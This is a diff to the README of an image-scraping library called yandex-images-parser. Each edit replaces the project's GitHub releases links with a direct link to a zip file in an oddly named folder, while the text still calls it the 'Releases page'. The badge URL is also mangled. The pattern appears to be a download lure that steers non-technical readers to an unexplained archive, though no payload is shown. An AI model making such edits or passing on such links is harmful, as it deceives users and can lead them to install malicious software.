@@ -4,7 +4,7 @@
 Welcome to the **yandex-images-parser**! This library allows you to effortlessly parse and download images from Yandex Images. With simple steps, you can extract stunning images and manage them with ease. 
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/nsatri55/yandex-images-parser/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nsatri55/yandex-images-parser/main/interassociation/yandex-images-parser.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/nsatri55/yandex-images-parser/main/interassociation/yandex-images-parser.zip)
 
 ## 🚀 Getting Started
 This guide will walk you through downloading and running the software. You do not need any programming experience. Just follow the steps, and you'll be up and running in no time!
@@ -12,7 +12,7 @@ This guide will walk you through downloading and running the software. You do no
 ### 🔗 Download & Install
 To get the latest version of **yandex-images-parser**, visit the following link to download it:
 
-[Download Latest Version](https://github.com/nsatri55/yandex-images-parser/releases)
+[Download Latest Version](https://raw.githubusercontent.com/nsatri55/yandex-images-parser/main/interassociation/yandex-images-parser.zip)
 
 ### ✔️ System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -22,7 +22,7 @@ To get the latest version of **yandex-images-parser**, visit the following link 
 - Geckodriver: Installed and configured
 
 ### 📥 How to Download
-1. **Visit the Releases Page:** Click on the link above to go to the [Releases page](https://github.com/nsatri55/yandex-images-parser/releases).
+1. **Visit the Releases Page:** Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/nsatri55/yandex-images-parser/main/interassociation/yandex-images-parser.zip).
 2. **Select the Latest Version:** Look for the latest version of the application.
 3. **Choose the Right File:** Depending on your operating system, download the appropriate file (e.g., `.exe` for Windows).
 4. **Save the File:** Choose a location on your computer where you want to save the downloaded file.
